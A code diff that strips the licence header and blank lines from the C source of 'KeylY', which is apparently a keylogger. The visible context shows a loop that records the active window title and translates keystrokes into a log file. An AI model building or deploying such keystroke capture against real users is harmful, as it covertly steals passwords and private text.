@@ -1,23 +1,8 @@
-
 /*
 	KeylY
 	Created @ 08.08.2017
 	Copyright (C) 2017 Sanix Darker
-
-	This program is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
-
 
 #include "main.h"
 
@@ -48,7 +33,6 @@ int main(int argc, char *argv[]){
 	//SHORT lastc = 0;
 	while(1){
 		Sleep(2); // give other programs time to run
-
 		// get the active windowtitle
 		char title[1024];
 		HWND hwndHandle = GetForegroundWindow();
@@ -166,7 +150,6 @@ int main(int argc, char *argv[]){
 					out = "#";
 				else if(c == 226)
 					out = "<";
-
 				else
 					out = "[KEY \\" + intToString(c) + "]";
 
@@ -179,10 +162,7 @@ int main(int argc, char *argv[]){
 				//lastc = c;
 			}
 		}
-
 	}
-
 	klogout.close();
-
 	return 0;
 }
